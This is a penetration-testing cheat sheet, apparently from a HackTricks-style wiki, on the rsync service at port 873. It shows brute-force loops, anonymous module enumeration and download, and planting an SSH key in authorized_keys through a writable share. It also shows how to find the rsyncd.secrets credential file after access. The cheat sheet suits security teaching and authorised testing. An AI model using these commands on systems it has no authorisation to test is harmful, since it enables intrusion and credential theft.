# 873 - rsync

## Theory

**rsync** is a utility for efficiently transferring and synchronizing files between a computer and an external hard disk and between networked computers (usually Linux). It determines synchronization by checking file sizes and timestamps. The rsync algorithm is a type of delta encoding and is used to minimize network usage. Zlib can be used for additional data compression, and SSH or stunnel can be used for security. What is the problem with this service? Weak configurations often provide unauthorized access to sensitive data, and sometimes the means to obtain a shell on the system. As you can imagine, the access we get depends heavily on the Rsync configuration.

### Modules (Shared directory)

An rsync module is a shared directory and has many features that you should know before listing these:

* They can **optionally** be **password protected**.
* A **shared name can be configured not to be listed**. So there might be something **hidden**. For example, if the module is named after a user and the files are `.bash_history`, `.bashrc`, `.profile`, etc., there **may be an .ssh directory that is being hidden**.
* It may also be that **some shared names are listed where some (different) credentials are needed to access**. Therefore, not always all listed names are going to be accessible and you will notice it if you get an "**Access Denied**" message when trying to access some of them.

Example of an rsync module:

{% hint style="info" %}
All modules are in the `/etc/rsyncd.conf` file
{% endhint %}

```bash
[confidential]
    path = /home/rsync/secret-out
    read only = no
    # Authentication:
    uid = levi
    gid = levi
    auth users = levi
    secrets file = /etc/rsyncd.secrets
    comment = For your eyes only
    hosts allow = 10.10.10.10
    list = false # Hidden module
```

### Configuration

Remote access to shared directories via Rsync requires two things, **access to shared files** and **file permissions**.

* The **shared file access** can be defined in `/etc/Rsyncd.conf` to provide anonymous or authenticated access.
* **File permissions** can also be defined in `/etc/Rsyncd.conf` by defining the user under which the Rsync service will be run. If Rsync is configured to run as root, then anyone who has permission to log in can access the shared files with the privileges of the root user.

Below is an example Rsyncd.conf file that allows anonymous root access to the entire file system:

```bash
motd file = /etc/Rsyncd.motd
lock file = /var/run/Rsync.lock
log file = /var/log/Rsyncd.log
pid file = /var/run/Rsyncd.pid
[files]
path = /
comment = Remote file share.
uid = 0
gid = 0
read only = no
list = yes
```

## Practice

### Banner & Manual communication

```bash
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy        	
NAS_Public     	
_NAS_Recycle_TOSRAID	<--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection


#Now lets try to enumerate "raidroot"
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
raidroot
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password
```

### Bruteforce

```bash
# Username and password:
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
# Only password bruteforce (#1):
cat <WORDLIST> | while read pass; do export RSYNC_PASSWORD=${pass}; rsync --list-only rsync://<USERNAME>@<IP>:<PORT>/<SHARE_NAME/FILE> 2>&1 | grep -q "auth failed" || { echo "[+] Found password: ${RSYNC_PASSWORD}"; break; } done
# Only password bruteforce with sshpass (#2):
for i in $(cat <WORDLIST>.txt); do
    sshpass -p "$password" rsync  rsync://<USERNAME>@<IP>:<PORT>/<SHARE_NAME/FILE> &>/dev/null
    if [ "$(echo $?)" == "0" ]; then
        echo -e "\n[+] Password: $password"
        exit 0
    fi
done
```

### List shared name/folder (without/with credentials)

{% hint style="info" %}
**Module = Shared directory/folder**
{% endhint %}

```bash
nmap -sV --script "rsync-list-modules" -p <PORT> <IP> # Nmap
msf> use auxiliary/scanner/rsync/modules_list # Metasploit

# Without credenciales
rsync <IP>::
rsync --port <PORT> <IP>::
rsync -av --list-only rsync://<IP>:<PORT> # PORT is optional. The "-a" parameter lists all files.
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730 # For IPv6

# With credentials:
rsync -av --list-only rsync://<USERNAME>@<IP>

# With credentials and environment variables:
export RSYNC_PASSWORD="<PASSWORD>" # With this we avoid that it continues asking for the password.
rsync -av --list-only rsync://<USERNAME>@<IP>
```

Once you have the **list of modules** you have a few different options depending on the actions you want to take and whether or not authentication is required.

### Enumerate content

```bash
# List sub directory contents:
rsync <IP>::<SHARE NAME>
rsync --list-only rsync://<IP>:<PORT>/<SHARE NAME>

# List directories and files recursively:
rsync -r <IP>::<SHARE NAME>/<DIRECTORY>/
rsync -r rsync://<IP>:<PORT>/<SHARE NAME>
```

### Download files/folders (without/with credentials)

```bash
# Download file:
rsync rsync://<IP>:<PORT>/<SHARE NAME>/<PATH TO FILE> . # 
# Download all files and subdirs from a specified directory (-r):
rsync -r rsync://<IP>:<PORT>/<SHARE NAME>/<PATH TO DIRECTORY> .
# This recursively transfers all files from the directory <shared_name> on
# the machine <IP> into the "rsync_shared" directory on the local machine:
rsync -av rsync://<USERNAME>@<IP>:<PORT>/<SHARE NAME> rsyn_shared
```

{% hint style="info" %}
If you use the "`-a`" parameter, the files are transferred in "archive" mode, which ensures that symbolic links, devices, attributes, permissions, ownerships, etc. are preserved in the transfer.
{% endhint %}

### Upload files/folders (only with credentials)

```bash
rsync id_rsa.pub rsync://<USERNAME>@<IP>/<SHARE NAME>/<PATH>/authorized_keys # Upload file
rsync myfolder rsync://<USERNAME>@<IP>/<SHARE NAME>/<PATH>/<FOLDER NAME> # Upload folder
rsync mydir rsync://<USERNAME>@<IP>/<SHARE NAME>/<PATH>/<DIR NAME> # Upload directory with content
```

### POST-Exploitation

Find the rsyncd configuration file:

```bash
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```

Inside the config file sometimes you could find the parameter _secrets file = /path/to/file_ and this file could contains usernames and passwords allowed to authenticate to rsyncd.

### References

{% embed url="https://book.hacktricks.xyz/pentesting/873-pentesting-rsync" %}

{% embed url="https://www.netspi.com/blog/technical/network-penetration-testing/linux-hacking-case-studies-part-1-rsync" %}
